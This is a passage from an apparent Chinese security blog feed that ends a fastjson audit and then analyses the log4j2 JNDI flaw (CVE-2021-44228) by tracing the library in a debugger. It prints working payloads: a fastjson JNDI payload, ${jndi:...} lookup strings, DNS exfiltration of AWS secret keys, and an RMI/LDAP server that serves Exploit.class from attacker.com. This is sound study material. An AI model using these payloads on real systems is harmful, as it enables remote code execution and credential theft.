class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span>,<br>    <span class="hljs-string">&quot;healthCheckRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747225970492-3ed495ff-2b8b-4f5d-9c8b-055f148730cb.png"></p><p>实际上用的是<code>com.zaxxer.hikari.HikariConfig</code>的gadget（在1.2.60加入了黑名单），不过在<code>hadoop-client-minicluster</code>中引入了该依赖，可以绕过黑名单</p>]]></content>
    
    
    <categories>
      
      <category>研究</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j2 CVE-2021-44228</title>
    <link href="/2025/04/25/log4j2%20CVE-2021-44228/"/>
    <url>/2025/04/25/log4j2%20CVE-2021-44228/</url>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>漏洞版本<code>2.0到2.14.1</code></p><p>用maven构建</p><p>pom.xml</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>    &lt;modelVersion&gt;<span class="hljs-number">4.0</span>.<span class="hljs-number">0</span>&lt;/modelVersion&gt;<br><br>    &lt;groupId&gt;org.example&lt;/groupId&gt;<br>    &lt;artifactId&gt;log4j2-test&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br><br>    &lt;properties&gt;<br>        &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;<br>        &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;<br>        &lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>    &lt;/properties&gt;<br><br>    &lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;<br>            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">2.14</span>.<span class="hljs-number">1</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;<br>            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">2.14</span>.<span class="hljs-number">1</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>    &lt;/dependencies&gt;<br>    <br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p>Main.javas</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">package org.example;<br>import org.apache.logging.log4j.LogManager;<br>import org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">final</span> Logger logger = LogManager.<span class="hljs-title function_ invoke__">getLogger</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_ invoke__">main</span>(String[] args) &#123;<br>        logger.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;$&#123;jndi:ldap://wko5f7.dnslog.cn&#125;&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试</p><p><img src="/mdimg/log4j2/1745421443098-38554e71-8db1-4c13-8dbd-e4e7bcebd8d8.png"></p><p><img src="/mdimg/log4j2/1745421462688-c15b0b49-3d6b-48ba-8b48-79a937c3170d.png"></p><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="log4j2的lookup查询"><a href="#log4j2的lookup查询" class="headerlink" title="log4j2的lookup查询"></a>log4j2的lookup查询</h2><blockquote><p>Lookup 是一种机制，用于动态获取和替换日志记录中的变量或属性的值。它提供了一种灵活的方式，可以在日志消息中引用、解析和插入各种上下文相关的信息。</p></blockquote><p>Log4j2 内置了多个 Lookup 实现，每个 Lookup 都有不同的用途和功能。以下是一些常见的 Lookup 类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;date&#125;：获取当前日期和时间，支持自定义格式。<br>$&#123;pid&#125;：获取当前进程的 ID。<br>$&#123;logLevel&#125;：获取当前日志记录的级别。<br>$&#123;sys:propertyName&#125;：获取系统属性的值，例如 $&#123;sys:user.home&#125; 获取用户主目录。<br>$&#123;env:variableName&#125;：获取环境变量的值，例如 $&#123;env:JAVA_HOME&#125; 获取 Java 安装路径。<br>$&#123;ctx:key&#125;：获取日志线程上下文（ThreadContext）中指定键的值。<br>$&#123;<span class="hljs-class"><span class="hljs-keyword">class</span>:<span class="hljs-title">fullyQualifiedName</span>:<span class="hljs-title">methodName</span>&#125;：获取指定类的静态方法的返回值。</span><br><span class="hljs-class">$</span>&#123;mdc:key&#125;：获取 <span class="hljs-title function_ invoke__">MDC</span> (Mapped Diagnostic Context) 中指定键的值。<br></code></pre></td></tr></table></figure><p>常用的信息收集查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;hostName&#125;<br>$&#123;sys:java.version&#125; → 当前 Java 版本（如 17.0.1）<br>$&#123;sys:user.name&#125; → 当前系统用户名<br>$&#123;sys:os.name&#125; → 操作系统名称（如 Linux）<br>$&#123;sys:os.version&#125;<br><br>$&#123;env:JAVA_VERSION&#125;<br>$&#123;env:AWS_SECRET_ACCESS_KEY&#125;<br>$&#123;env:AWS_SESSION_TOKEN&#125;<br>$&#123;env:AWS_SHARED_CREDENTIALS_FILE&#125;<br>$&#123;env:AWS_WEB_IDENTITY_TOKEN_FILE&#125;<br>$&#123;env:AWS_PROFILE&#125;<br>$&#123;env:AWS_CONFIG_FILE&#125;<br>$&#123;env:AWS_ACCESS_KEY_ID&#125;<br>$&#123;env:PATH&#125; → 系统 PATH 环境变量<br>$&#123;env:HOME&#125; → 用户home目录路径<br></code></pre></td></tr></table></figure><h2 id="lookup的jndi解析器"><a href="#lookup的jndi解析器" class="headerlink" title="lookup的jndi解析器"></a>lookup的jndi解析器</h2><blockquote><p>JNDI（Java Naming and Directory Interface，Java 命名和目录接口） 是 Java 提供的一个 统一 API，用于访问各种命名和目录服务（如 LDAP、DNS、RMI、文件系统等）。它的核心作用是 通过名称（Name）查找资源（Object），类似于“电话号码簿”的概念。</p></blockquote><p>jndi解析器语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">$&#123;jndi:协议://地址/资源路径&#125;<br><br>支持的协议：<br>dns, ldap, ldaps, rmi ,iiop, iiopname,corbname,corba <br></code></pre></td></tr></table></figure><p>比如<code>$&#123;jndi:dns://zkbp6w.dnslog.cn&#125;</code>会发送dns请求</p><p>lookup支持嵌套查询如<code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.zkbp6w.dnslog.cn&#125;</code></p><p>可以通过这种方式dns外带一些信息</p><p>这个解析器也是log4j2的漏洞源头</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><blockquote><p><strong>LDAP（Lightweight Directory Access Protocol，轻量级目录访问协议）</strong> 是一种用于 <strong>访问和维护分布式目录服务</strong> 的协议。它类似于“网络电话簿”，专门用来高效查询和修改 <strong>层次化目录数据</strong>（如用户账号、组织架构、设备信息等）。</p></blockquote><p>就类似一个电话簿，当请求查询，参数为一个名字时（假设是唯一的），就会返回该名字对应的电话号码。</p><p>比如<code>jndi:ldap://localhost/test</code></p><p>jndi对ldap服务器请求查询<code>test</code>，服务器会有如下响应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">dn: test    //唯一条目，类似数据库的主键<br>objectClass: javaNamingReference<br>javaClassName: Exploit<br>javaFactory: Exploit<br>javaCodeBase: http://attacker.com/<br></code></pre></td></tr></table></figure><p>当Java程序接收到这个响应的时候，会从 <code>**javaCodeBase**</code> 指定的 <code>**http://attacker.com/**</code> 下载 <code>**Exploit.class**</code>然后就会实例化这个类并执行其构造方法。这就是通过<code>jndi</code>请求<code>ldap</code>的方式来<code>RCE</code>的原理。</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><blockquote><p>RMI（Remote Method Invocation，远程方法调用）是 Java 提供的一种用于实现<strong>分布式程序</strong>的技术，允许一个 Java 虚拟机（JVM）上的对象调用另一个 JVM 上的对象方法，就像调用本地方法一样。</p></blockquote><p>远程接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// MyRemote.java</span><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyRemote</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>远程接口实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// MyRemoteImpl.java</span><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRemoteImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyRemote</span> &#123;<br><br>    <span class="hljs-comment">// 必须提供构造函数并抛出 RemoteException</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyRemoteImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>(); <span class="hljs-comment">// 调用 UnicastRemoteObject 的构造方法</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, &quot;</span> + name + <span class="hljs-string">&quot;! (from RMI Server)&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> a + b;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 1. 创建远程对象实例</span><br>            <span class="hljs-type">MyRemote</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRemoteImpl</span>();<br><br>            <span class="hljs-comment">// 2. 启动 RMI Registry（默认端口 1099）</span><br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>            <span class="hljs-comment">// 3. 绑定远程对象到 Registry，客户端通过名称查找</span><br>            registry.bind(<span class="hljs-string">&quot;MyRemoteService&quot;</span>, service);<br><br>            System.out.println(<span class="hljs-string">&quot;RMI Server is running...&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 1. 获取 RMI Registry（连接到 Server 的 1099 端口）</span><br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>            <span class="hljs-comment">// 2. 通过名称查找远程对象</span><br>            <span class="hljs-type">MyRemote</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> (MyRemote) registry.lookup(<span class="hljs-string">&quot;MyRemoteService&quot;</span>);<br><br>            <span class="hljs-comment">// 3. 调用远程方法</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> service.sayHello(<span class="hljs-string">&quot;Alice&quot;</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> service.add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Server says: &quot;</span> + greeting);<br>            System.out.println(<span class="hljs-string">&quot;5 + 3 = &quot;</span> + result);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/log4j2/1745480126569-7ca9eba0-beaa-4f4c-bf69-d4b0f4499fb9.png"></p><p><img src="/mdimg/log4j2/1745480108053-b407de16-087a-4930-b78f-40af29271d33.png"></p><p>对于<code>$&#123;jndi:rmi://attacker.com:1099/Exploit&#125;</code></p><p>通过 JNDI 请求 <code>**attacker.com:1099**</code> 的 RMI 服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;http://attacker.com:8000/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, refWrapper);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is ready...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMI 返回一个 <code>**Reference**</code> 对象，指向 <code>**http://attacker.com:8000/Exploit.class**</code>，jndi会动态加载<code>**Reference**</code> 并实例化，也就是Java程序加载该<code>**Exploit.class**</code>并执行其中的恶意代码实现rce</p><hr><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>下断点调试</p><p><img src="/mdimg/log4j2/1745502857339-5beed186-1d15-487c-8c6c-59f9ccbeba51.png"></p><p>一路f7，只关注我们传入的值到</p><p><code>\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\layout\PatternLayout.class:400</code></p><p>这个循环，每循环一次<code>buffer</code>就会增加一些字符（这个其实就是输出的error），先是时间，然后是包路径，可以看到i=8前（也就是第8次循环结束后）的值为<code>21:45:25.009 [main] ERROR org.example.Main - </code></p><p><img src="/mdimg/log4j2/1745503018945-92167943-fc50-422d-ac1c-42f1b6e637f4.png"></p><p>根据<code>ERROR</code>的输出可以知道，接下来这次循环（i=8，第九次循环）<code>22:17:09.853 [main] ERROR org.example.Main -</code>后面处理的是我们输入的字符</p><p><img src="/mdimg/log4j2/1745504254097-77fd5cac-01ce-4709-9264-23f775d12eea.png"></p><p>到<code>D:\maven_repo\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\pattern\MessagePatternConverter.class:100</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.config != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.noLookups) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> offset; i &lt; workingBuilder.length() - <span class="hljs-number">1</span>; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (workingBuilder.charAt(i) == <span class="hljs-string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> workingBuilder.substring(offset, workingBuilder.length());<br>            workingBuilder.setLength(offset);<br>            workingBuilder.append(<span class="hljs-built_in">this</span>.config.getStrSubstitutor().replace(event, value));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对<code>$&#123;</code>开头的字符做一些处理继续跟进</p><p>到<code>D:\maven_repo\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\StrSubstitutor.class：418</code></p><p>f7可以看到<code>resolveVariable</code>方法调用了<code>lookup</code></p><p><img src="/mdimg/log4j2/1745505096054-c8a3eb16-8441-4c01-ad64-bc32b42d4748.png"></p><p>lookup方法在<code>D:\maven_repo\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\Interpolator.class：148</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, String <span class="hljs-keyword">var</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">var</span> == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">prefixPos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">var</span>.indexOf(<span class="hljs-number">58</span>);<br>        <span class="hljs-keyword">if</span> (prefixPos &gt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">prefix</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">var</span>.substring(<span class="hljs-number">0</span>, prefixPos).toLowerCase(Locale.US);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">var</span>.substring(prefixPos + <span class="hljs-number">1</span>);<br>            <span class="hljs-type">StrLookup</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> (StrLookup)<span class="hljs-built_in">this</span>.strLookupMap.get(prefix);<br>            <span class="hljs-keyword">if</span> (lookup <span class="hljs-keyword">instanceof</span> ConfigurationAware) &#123;<br>                ((ConfigurationAware)lookup).setConfiguration(<span class="hljs-built_in">this</span>.configuration);<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">if</span> (lookup != <span class="hljs-literal">null</span>) &#123;<br>                value = event == <span class="hljs-literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> value;<br>            &#125;<br><br>            <span class="hljs-keyword">var</span> = <span class="hljs-keyword">var</span>.substring(prefixPos + <span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.defaultLookup != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> event == <span class="hljs-literal">null</span> ? <span class="hljs-built_in">this</span>.defaultLookup.lookup(<span class="hljs-keyword">var</span>) : <span class="hljs-built_in">this</span>.defaultLookup.lookup(event, <span class="hljs-keyword">var</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个lookup会调用<code>D:\maven_repo\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\Interpolator.class：148</code>的lookup并且会根据解析到不同的解析器进入到对应的lookup查询</p><p>而这个lookup又会调用<code>D:\maven_repo\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\MapLookup.class：68</code>的lookup</p><p>而实际上解析<code>$&#123;hostName&#125;</code>的是这个lookup</p><p><img src="/mdimg/log4j2/1745505426241-36ed659e-13d7-40c0-8d09-339e343aa6a8.png"></p><p>此时语句就会变成<code>$&#123;jndi:dns://xxx.zkbp6w.dnslog.cn&#125;</code></p><p>然后会继续<code>D:\maven_repo\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\pattern\MessagePatternConverter.class:100</code>的循环，直到匹配到下一个<code>$&#123;</code>也就是解析器，这里就是处理嵌套查询的地方</p><p>然后会跟前面<code>$&#123;hostName&#125;</code>一样再次处理<code>$&#123;jndi:dns://xxx.zkbp6w.dnslog.cn&#125;</code>，然后调用对应的lookup</p><p>当匹配到<code>jndi</code>的时候</p><p><img src="/mdimg/log4j2/1745506050862-96f4ca56-3e8a-41e0-9a69-6f320b18b7be.png"></p><p>会调用<code>D:\maven_repo\org\apache\logging\log4j\log4j-core\2.14.1\log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\lookup\JndiLookup.class：30</code>的lookup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 